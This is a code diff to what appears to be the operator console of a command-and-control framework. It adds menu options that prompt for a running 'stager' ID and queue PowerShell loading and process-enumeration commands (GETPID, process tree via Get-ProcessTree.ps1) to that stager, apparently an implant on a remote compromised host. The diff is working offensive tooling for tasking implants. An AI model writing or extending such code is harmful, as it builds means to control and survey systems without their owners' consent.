@@ -1115,6 +1115,48 @@ class mymainclass():
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION2)
                     continue
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPID:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPID)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPSTREE:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE)
+                    continue
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETPSTREE2:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE2)
+                    continue
 
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETCLM:
